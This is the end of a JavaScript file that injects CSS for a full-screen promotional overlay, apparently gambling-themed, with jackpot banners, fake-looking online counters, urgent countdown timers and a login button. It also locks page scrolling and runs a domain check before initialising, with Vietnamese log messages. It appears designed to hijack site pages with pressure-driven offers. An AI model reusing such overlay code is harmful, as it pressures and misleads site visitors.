           .neo-timer-modern.urgent .neo-timer-box {
               animation: pulse-box 1s infinite alternate;
           }
           
           @keyframes pulse-value {
               0% { color: #fff; text-shadow: 0 0 10px rgba(255, 170, 0, 0.7); }
               100% { color: #ff5252; text-shadow: 0 0 15px rgba(255, 82, 82, 0.8); }
           }
           
           @keyframes pulse-box {
               0% { background: linear-gradient(to bottom, #333, #111); }
               100% { background: linear-gradient(to bottom, #471515, #220808); }
           }

           @media (min-width: 768px) {
               .neo-title {
                   font-size: 28px;
               }
               
               .mobile-break {
                   display: none;
               }
               
               .desktop-dash {
                   display: inline;
               }
           }

           @media (min-width: 1024px) {
               .neo-container {
                   max-width: 100%;
               }
               
               .neo-title {
                   font-size: 32px;
               }
           }

           @media (max-width: 767px) {
               .neo-container {
                   width: 100%;
                   max-width: 100%;
                   border-radius: 0;
                   overflow: hidden;
               }
               
               .neo-main {
                   padding: 15px 20px 120px;
                   overflow-y: auto;
                   -ms-overflow-style: none;
                   scrollbar-width: none;
               }
               
               .neo-main::-webkit-scrollbar {
                   display: none;
               }
               
               .neo-header {
                   padding: 10px 0;
               }
               
               .neo-title {
                   font-size: 20px;
                   padding: 0 10px;
                   line-height: 1.4;
               }
               
               .mobile-break {
                   display: inline;
               }
               
               .neo-winner-animation {
                   height: 40px;
                   margin-bottom: 10px;
               }
               
               .neo-jackpot-banner {
                   padding: 8px 5px;
                   font-size: 15px;
               }
               
               .neo-online-counter-top {
                   padding: 6px 0;
               }
               
               .neo-online-counter-content {
                   font-size: 15px;
               }
               
               .neo-limited-offer-banner {
                   font-size: 18px;
                   padding: 10px 5px;
                   margin: 3px 0 10px;
                   flex-direction: column;
                   line-height: 1.4;
               }
               
               .neo-offer-line1, .neo-offer-line2 {
                   display: block;
                   width: 100%;
                   text-align: center;
               }
               
               .neo-offer-line2 {
                   margin-left: 0;
               }
               
               .neo-remaining {
                   font-size: 22px;
                   margin: 0 5px;
                   padding: 2px 8px;
               }
               
               .neo-content-grid {
                   display: flex;
                   flex-direction: column;
                   grid-template-columns: 1fr;
                   grid-gap: 12px;
                   margin-top: 5px;
               }
               
               .neo-timer-modern {
                   margin-bottom: 12px;
                   padding: 12px;
               }
               
               .neo-timer-title {
                   font-size: 16px;
                   margin-bottom: 8px;
               }
               
               .neo-timer-box {
                   min-width: 55px;
                   padding: 8px 10px;
               }
               
               .neo-timer-value {
                   font-size: 26px;
               }
               
               .neo-timer-label {
                   font-size: 12px;
               }
               
               .neo-timer-separator {
                   font-size: 26px;
               }
               
               .neo-cta-a, .neo-cta-b {
                   height: 70px;
                   padding: 12px 15px;
                   margin-bottom: 10px;
               }
               
               .neo-cta-title {
                   font-size: 16px;
               }
               
               .neo-cta-desc {
                   font-size: 18px;
               }
               
               .neo-login-button-top {
                   height: 70px;
                   font-size: 18px;
                   width: 100%;
               }
               
               .neo-security-info {
                   padding: 10px;
                   font-size: 12px;
                   white-space: nowrap;
                   letter-spacing: 0.2px;
               }
               
               .neo-footer {
                   padding: 10px 0;
                   font-size: 12px;
               }
               
               .neo-friendly-popup {
                   width: 95%;
                   padding: 20px 15px;
               }
               
               .neo-friendly-title {
                   font-size: 20px;
               }
               
               .neo-friendly-message {
                   font-size: 14px;
               }
               
               .neo-friendly-question {
                   font-size: 18px;
               }
               
               .neo-friendly-buttons {
                   flex-direction: column;
                   gap: 10px;
               }
               
               .neo-friendly-btn-later, .neo-friendly-btn-continue {
                   width: 100%;
                   padding: 12px 10px;
               }
               
               .desktop-dash {
                   display: none;
               }
           }

           @media (max-width: 359px) {
               .neo-title {
                   font-size: 18px;
               }
               
               .neo-main {
                   padding: 10px 15px 120px;
               }
               
               .neo-winner-animation {
                   height: 35px;
                   margin-bottom: 8px;
               }
               
               .neo-jackpot-banner {
                   padding: 6px 5px;
                   font-size: 14px;
               }
               
               .neo-online-counter-top {
                   padding: 5px 0;
               }
               
               .neo-online-counter-content {
                   font-size: 14px;
               }
               
               .neo-limited-offer-banner {
                   font-size: 18px;
                   padding: 8px 5px;
                   margin: 2px 0 8px;
               }
               
               .neo-timer-container {
                   gap: 8px;
               }
               
               .neo-timer-box {
                   min-width: 45px;
                   padding: 6px 8px;
               }
               
               .neo-timer-value {
                   font-size: 22px;
               }
               
               .neo-limited-offer-banner {
                   font-size: 18px;
               }
               
               .neo-remaining {
                   font-size: 20px;
                   padding: 2px 6px;
               }
           }

           @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap');

           @media (min-width: 768px) {
               .mobile-break {
                   display: none;
               }
           }

           @media (max-width: 767px) {
               .desktop-dash {
                   display: none;
               }
           }

           .mobile-break-banner {
               display: none;
           }

           body, html {
               overflow: hidden;
               position: fixed;
               width: 100%;
               height: 100%;
           }

           @keyframes pulse {
               0% {
                   transform: scale(1);
               }
               50% {
                   transform: scale(1.05);
               }
               100% {
                   transform: scale(1);
               }
           }
       `;
       
       document.head.appendChild(styleElement);
   }

   function addGoogleFont() {
       const fontLink = document.createElement('link');
       fontLink.rel = 'preconnect';
       fontLink.href = 'https://fonts.googleapis.com';
       document.head.appendChild(fontLink);
       
       const gstaticsLink = document.createElement('link');
       gstaticsLink.rel = 'preconnect';
       gstaticsLink.href = 'https://fonts.gstatic.com';
       gstaticsLink.crossOrigin = 'anonymous';
       document.head.appendChild(gstaticsLink);
       
       const fontStylesheet = document.createElement('link');
       fontStylesheet.rel = 'stylesheet';
       fontStylesheet.href = 'https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&family=Open+Sans:wght@400;700;800&display=swap';
       document.head.appendChild(fontStylesheet);
   }

   addGoogleFont();

   // Khởi tạo khi trang web đã tải xong
   console.log("Script đã tải, bắt đầu kiểm tra domain...");

   if (document.readyState === "loading") {
       console.log("Trang đang tải, đợi DOMContentLoaded...");
       document.addEventListener("DOMContentLoaded", checkDomainAndInitialize);
   } else {
       console.log("Trang đã tải xong, kiểm tra domain ngay lập tức");
       checkDomainAndInitialize();
   }
})();